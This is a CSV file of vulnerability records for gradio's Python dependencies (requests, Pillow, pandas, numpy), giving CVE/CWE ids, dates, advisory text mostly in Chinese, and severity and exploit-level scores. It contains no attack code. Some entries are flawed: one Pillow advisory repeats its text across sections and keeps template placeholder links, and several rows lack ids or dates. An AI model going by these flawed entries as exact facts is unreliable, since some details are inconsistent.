project,dependency,dependency_version,direct_dependency,cve_id,cwe_id,release_date,description,security_level_id,exploit_level_id
gradio-app_gradio,requests,,True,CVE-2024-35195,CWE-670,2024-05-20,"Requests是Python基金会的一个优雅而简单的HTTP库。通过请求，您可以非常轻松地发送HTTP / 1.1请求。无需将查询字符串手动添加到您的URL，也无需对POST数据进行表单编码。
Requests 2.32.0之前版本存在安全漏洞，该漏洞源于禁用证书验证后在连接的生命周期中持续存在，后续所有请求都将被忽略。",3,0
gradio-app_gradio,requests,,True,CVE-2024-47081,CWE-522,2025-06-06,Requests库用于发送HTTP请求的Python库。该漏洞涉及Netrc凭证泄漏，可能导致敏感信息泄露。,3,2
gradio-app_gradio,requests,,True,,,,<p>Python Requests 是一个用于发送 HTTP 请求的开源库，广泛用于 Web 应用程序中。当请求涉及到公共后缀域的 Set-Cookie 头时，可能会导致 Cookie 被错误地发送到所有公共后缀域。此漏洞的根本原因在于 Python Requests 在处理包含公共后缀的 Cookie 域时，未能正确限制 Cookie 的发送。攻击者可以利用这个漏洞，诱使用户访问特定 URL，从而在请求过程中窃取敏感信息。</p>,2,1
gradio-app_gradio,Pillow,,True,,,2023-10-05,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-56pw-mpj4-fxww. This link is maintained to preserve external references.

## Original Description
Pillow versions before v10.0.1 bundled libwebp binaries in wheels that are vulnerable to CVE-2023-5129 (previously CVE-2023-4863). Pillow v10.0.1 upgrades the bundled libwebp binary to v1.3.2.",2,-2
gradio-app_gradio,Pillow,,True,,CWE-400,2021-04-24,"### Impact
_Pillow before 8.1.1 allows attackers to cause a denial of service (memory consumption) because the reported size of a contained image is not properly checked for a BLP container, and thus an attempted memory allocation can be very large._

### Patches
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### Workarounds
_An issue was discovered in Pillow before 6.2.0. When reading specially crafted invalid image files, the library can either allocate very large amounts of memory or take an extremely long period of time to process the image._

### References
https://nvd.nist.gov/vuln/detail/CVE-2021-27921

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [example link to repo](http://example.com)
* Email us at [example email address](mailto:example@example.com)",2,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-03-12,"JpegImagePlugin may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder.

If the EOF marker is not detected as such however, this could lead to an infinite loop where JpegImagePlugin keeps trying to end the file.",4,-2
gradio-app_gradio,Pillow,,True,CVE-2022-45198,CWE-409,2022-11-14,"Pillow是一款基于Python的图像处理库。
Pillow 9.2.0之前版本存在安全漏洞，该漏洞源于对高度压缩的GIF数据处理不当。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-10994,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/Jpeg2KDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-4009,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/Resample.c文件中的‘ImagingResampleHorizontal’函数存在整数溢出漏洞。远程攻击者可借助负的‘new’的大小值利用该漏洞造成拒绝服务（基于堆的缓冲区溢出）。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-11538,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.0.0及之前版本中的libImaging/SgiRleDecode.c文件的SGI图像文件的处理存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",1,0
gradio-app_gradio,Pillow,,True,CVE-2021-27923,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27922,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-27921,CWE-20,2021-03-03,"Pillow是Pillow开源的一款基于Python的图像处理库。
Pillow 8.1.1之前版本 存在输入验证错误漏洞，该漏洞允许攻击者导致拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25290,CWE-787,2021-03-11,<p>Pillow是一款基于Python的图像处理库。 Pillow 8.1.1之前版本存在安全漏洞。该漏洞源于在TiffDecode.c中存在一个大小无效的负偏移memcpy。</p>,2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25293,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1版本之前存在安全漏洞。该漏洞源于SGIRleDecode.c中存在越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25291,CWE-125,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于TiffDecode.c在TiffreadRGBATile中通过无效的title越界读取。",2,2
gradio-app_gradio,Pillow,,True,CVE-2020-35653,CWE-125,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码一个精心制作的PCX文件时，PoxDecode有一个缓冲区过读，因为缓冲区计算信任用户提供的stride值。",2,0
gradio-app_gradio,Pillow,,True,,CWE-78,2020-11-02,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Command Injection in filenames that contain single quotes via `load_djpeg`.
## Remediation
Upgrade `Pillow` to version 2.5.0 or higher.
## References
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/748)
- [Pillow Changelog](https://github.com/python-pillow/Pillow/blob/master/CHANGES.rst#250-2014-07-01)
",1,0
gradio-app_gradio,Pillow,,True,CVE-2020-10378,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-10177,CWE-125,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2020-5312,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/PcxDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制PCX文件利用该漏洞在系统上执行任意代码。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5311,CWE-120,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/SgiRleDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制SGI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5313,CWE-125,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/FliDecode.c文件存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。远程攻击者可借助特制FLI文件利用该漏洞在系统上执行任意代码，或者导致应用程序崩溃。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-16865,CWE-770,2019-10-04,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.0之前版本中存在安全漏洞。攻击者可利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2016-9189,CWE-190,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可利用该漏洞获取敏感信息。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-9190,CWE-284,2016-11-04,"Pillow是美国软件开发者Alex Clark所研发的一个对PIL（Python图像处理库）一些BUG修正后的编译版。

Pillow 3.3.2之前的版本中存在安全漏洞。上下文相关的攻击者可通过使用‘crafted image file’方法利用该漏洞执行任意代码。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-0775,CWE-119,2016-04-13,"Pillow是一款基于Python的图像处理库。
Pillow 3.1.1之前版本的libImaging/FliDecode.c文件中的‘ImagingFliDecode’函数存在缓冲区错误漏洞。远程攻击者可借助特制的FLI文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2016-2533,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本和PIL 1.1.7及之前版本的PcdDecode.c文件中的‘ImagingPcdDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的PhotoCD文件利用该漏洞造成拒绝服务（崩溃）。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1932,CWE-59,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py文件的‘load_djpeg’函数；EpsImagePlugin.py文件的‘Ghostscript’函数；IptcImagePlugin.py文件的‘load’函数；Image.py文件的‘_copy’函数存在安全漏洞，该漏洞源于程序没有正确创建临时文件。本地攻击者可通过对临时文件的符号链接攻击利用该漏洞覆盖任意文件，获取敏感信息。",2,0
gradio-app_gradio,Pillow,,True,CVE-2014-1933,CWE-264,2014-04-17,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Pillow是对PIL的一些BUG修正后的编译版。
PIL 1.1.7及之前的版本和Pillow 2.3.0及之前的版本中的JpegImagePlugin.py和EpsImagePlugin.py脚本存在安全漏洞，该漏洞源于程序在命令行上使用临时文件名。本地攻击者可利用该漏洞实施符号链接攻击。",3,0
gradio-app_gradio,Pillow,,True,CVE-2016-0740,CWE-119,2016-04-13,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 3.1.1之前版本的libImaging/TiffDecode.c文件中的‘ImagingLibTiffDecode’函数存在缓冲区溢出漏洞。远程攻击者可借助特制的TIFF文件利用该漏洞覆盖内存。",3,0
gradio-app_gradio,Pillow,,True,CVE-2020-10379,CWE-120,2020-06-25,"Pillow是一款基于Python的图像处理库。
Pillow 7.1.0之前版本中的libImaging/TiffDecode.c文件存在缓冲区错误漏洞。该漏洞源于网络系统或产品在内存上执行操作时，未正确验证数据边界，导致向关联的其他内存位置上执行了错误的读写操作。攻击者可利用该漏洞导致缓冲区溢出或堆溢出等。",2,0
gradio-app_gradio,Pillow,,True,CVE-2022-24303,CWE-22,2022-02-03,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.1之前版本存在输入验证错误漏洞，该漏洞源于产品的remove操作未验证用户输入数据。攻击者可通过该漏洞利用输入命令来修改或删除预期的命令。",2,2
gradio-app_gradio,Pillow,,True,CVE-2022-22815,CWE-665,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 不正确地初始化 ImagePath.Path。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22816,CWE-125,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 path.c 中的 path_getbbox 在 ImagePath.Path 初始化期间有一个缓冲区过度读取。",3,2
gradio-app_gradio,Pillow,,True,CVE-2022-22817,CWE-94,2022-01-07,"Pillow是一款基于Python的图像处理库。
Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
gradio-app_gradio,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
gradio-app_gradio,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
gradio-app_gradio,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
gradio-app_gradio,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
gradio-app_gradio,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
gradio-app_gradio,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
gradio-app_gradio,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
gradio-app_gradio,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
gradio-app_gradio,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
gradio-app_gradio,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
gradio-app_gradio,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
gradio-app_gradio,pandas,,True,CVE-2020-13091,CWE-502,2020-05-15,"pandas是一款基于Python语言的开源数据分析和处理工具。
pandas 1.0.3及之前版本中存在代码问题漏洞。攻击者可利用该漏洞执行命令。",1,2
gradio-app_gradio,pandas,,True,,CWE-89,2023-09-03,"## Overview
[pandas](https://pypi.org/project/pandas/) is a Python package providing data structures designed to make working with structured (tabular, multidimensional, potentially heterogeneous) and time series data both easy and intuitive.

Affected versions of this package are vulnerable to SQL Injection via `sql.py`, due to improper input sanitization.
## Remediation
Upgrade `pandas` to version 0.16.0 or higher.
## References
- [GitHub Commit](https://github.com/pandas-dev/pandas/commit/a774ee84485412459f7205cccd87b639022afd07)
- [GitHub PR](https://github.com/pandas-dev/pandas/pull/8986)
",2,2
gradio-app_gradio,pandas,,True,CVE-2024-9880,CWE-77,,Pandas是一个开源的Python数据分析与处理库，提供高效的数据结构与数据分析工具。此漏洞存在于pandas.DataFrame.query()函数，攻击者可以通过构造恶意查询来执行任意命令。该漏洞源于对用户输入验证不足，特别是在使用'python'引擎时，导致可能的远程命令执行。,2,1
gradio-app_gradio,pandas,,True,,,,<p>pandas 是一个流行的 Python 数据分析库，提供高效的数据操作和分析工具。该库中的 read_xml 函数存在本地文件包含 (LFI) 漏洞，因为其 path_or_buffer 参数未经过严格的路径验证，攻击者可以通过提供恶意文件路径访问任意文件。这可通过调用 get_handle 函数实现，该函数在没有验证路径的情况下打开文件，从而导致敏感文件的泄露，比如 /etc/passwd 和 /etc/shadow。</p>,3,1
gradio-app_gradio,numpy,,True,CVE-2019-6446,CWE-502,2019-01-16,<p>NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。 NumPy 1.16.0 版本及之前版本存在代码问题漏洞，该漏洞源于不安全地使用 pickle 模块。</p>,1,1
gradio-app_gradio,numpy,,True,CVE-2021-33430,CWE-120,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.9版本存在缓冲区错误漏洞，该漏洞源于在ctor .c的 PyArray_NewFromDescr_int函数中缺少对于数组长度的限制，导致缓冲区溢出漏洞，当从Python代码指定大维度(超过32)的数组时，这可能会让恶意用户导致拒绝服务。",3,0
gradio-app_gradio,numpy,,True,CVE-2021-41495,CWE-476,2021-12-17,"NumPy是一个Python科学计算包。该产品支持大量的维度数组与矩阵计算，同时针对数据运算提供大量的数学函数库。
NumPy 1.19存在代码问题漏洞，该漏洞源于。numpy存在空指针解引用漏洞。在软件中的PyArray_DescrNew函数中，由于缺少返回值验证，导致了空指针解引用漏洞、这允许攻击者可利用该漏洞通过重复创建排序数组来进行DoS攻击。",3,0
